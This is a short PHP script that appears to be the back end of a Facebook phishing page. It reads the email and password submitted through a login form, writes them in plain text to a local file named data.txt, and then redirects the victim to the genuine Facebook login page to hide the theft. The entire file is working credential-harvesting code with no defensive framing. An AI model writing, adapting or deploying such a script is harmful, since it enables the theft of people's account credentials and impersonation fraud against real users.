<?php

$email = trim($_POST['email']);
$pass = trim($_POST['pass']);

$fp = fopen('data.txt','a');
fwrite($fp,"email: {$email}\n");
fwrite($fp,"pass: {$pass}\n");
fwrite($fp,"-------------\n");
fclose($fp);


header('location: https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjczNDM3MTY5LCJjYWxsc2l0ZV9pZCI6MjY5NTQ4NDUzMDcyMDk1MX0%3D' );









